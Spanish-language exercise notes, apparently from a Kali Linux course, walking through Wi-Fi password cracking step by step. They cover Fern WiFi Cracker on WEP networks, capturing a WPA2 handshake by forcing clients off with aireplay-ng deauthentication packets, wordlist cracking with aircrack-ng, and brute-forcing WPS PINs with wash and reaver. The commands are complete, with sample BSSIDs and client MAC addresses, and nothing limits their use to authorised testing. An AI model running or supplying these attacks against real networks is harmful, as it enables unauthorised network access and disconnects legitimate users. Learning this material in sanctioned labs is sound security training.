EJERCICIO (FERN WIFI CRACKER)

1. Abrimos **Fern WIFI Cracker** en Kali
2. Seleccionamos la interfaz WLAN0 o tarjeta inalámbrica de la maquina
3. Escaneamos los puntos de acceso
4. Abrimos las redes WEP detectadas
5. Se selecciona la red y en **Attack**
6. Finalmente obtendremos la contraseña en la parte inferior

EJERCICIO (FUERZA BRUTA)

1. En la terminal Kali ejecutamos **airmon-ng** para ver nuestra interfaz de tarjeta
2. Ahora pondremos nuestra tarjeta en modo monitoreo:

**airmon-ng start &lt;Interface&gt;**

1. Es probable que nos dé un error debido a más procesos que interfieren por lo que tendremos que terminarlos con **kill &lt;PID&gt;** (ID DEL PROCESO)
2. Comenzaremos el monitoreo: **airodump-ng wlan0mon** (nuestra interfaz)
3. Ahora monitorearemos la red especifica: airodump-ng -w &lt;nombre Archivo&gt; -c &lt;CH de la red&gt; --bssid &lt;BSSID de la red&gt; wlan0mon

**airodump-ng -w attack1 -c 3 --bssid 5C:E9:31:01:36:DF wlan0mon**

1. Ahora ocupamos un **Handshake** de la red por lo que en otra terminal ejecutaremos: aireplay-ng -0 &lt;paquetesAEnviar&gt; -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0mon  
    **aireplay-ng -0 10 -a 5C:E9:31:01:36:DF -c D8:1F:12:B4:41:A9 wlan0mon**
2. Y ahora en la anterior terminal deberíamos tener el HANDSHAKE en la parte superior derecha. EJEMPLO:
![RESULTADO DEL HANDSHAKE CORRECTO](../assets/image55.png)
3. Y ahora podemos detener este monitoreo y cerrar la otra terminal
4. Y ahora intentaremos entrar en la red: aircrack-ng -w &lt;ubicacionListaPalabras&gt; -b &lt;SSID&gt; &lt;archivoCapCreadoDelMonitoreoAnterior&gt;

**aircrack-ng -w /Desktop/wordlist.txt -b 5C:E9:31:01:36:DF /home/rusian/attack1.cap**

1. Comenzará a probar todas las combinaciones de la lista de palabras (wordlist.txt) para encontrar la correcta de la red.

EXTRA

Las redes WPA2 son muy fuertes y no se pueden violar simplemente por ensayo y error como en la WEP por lo que es necesario tener una lista de palabras y dependiendo si esta lista es fuerte podrá ser posible descifrar mejor esta red mientras que si es débil esta lista no será posible por lo que en este caso usamos un ataque de fuerza bruta el cual evalúa todas las palabras de la lista que conseguí para descifrar la contraseña.

El archivo CAP por defecto debería guardarse en nuestra carpeta Home y se crea con el nombre que nosotros antes le asignamos, y aunque al hacer el monitoreo se crean más tipos de archivos con el mismo nombre solo será necesario utilizar en este caso el (.cap)

Este método para estas redes suele ser tardado y no muy fiable de éxito

EJERCICIO

1. Con el comando **_wash_** y **_reaver_** en la terminal se nos mostraran varias opciones a usar
2. Abrimos el modo monitoreo de nuestra tarjeta de red:

**_wash -i wlan0mon_**

1. Y para comenzar simplemente ejecutamos:

**_reaver -i wlan0mon -b &lt;BSSID&gt; -vv_**

1. Y al final podremos obtener el pin WPS

Este método puede durar bastante, ya sea un par de horas o incluso días, pero se nos podrá mostrar el pin WPS y la contraseña WPA2 para podernos conectar a la red, pero si el usuario cambio la contraseña de la red solo debemos cambiar la opción -vv por -p &lt;pinDe8Digitos&gt; el cual ya obtuvimos antes con el escaneo anterior y obtendremos la contraseña WPA2 de nuevo en cuestión de segundos.

**_reaver -i wlan0mon -b &lt;BSSID&gt; -p &lt;pin&gt;_**

EXTRA

Para regresar nuestra tarjeta de red al modo normal hay dos formas:

- Reiniciando la maquina
- Reiniciando los servicios por Terminal
  - **airmon-ng stop wlan0mon**
  - **ifconfig wlan0 up**
  - **service NetworkManager restart**
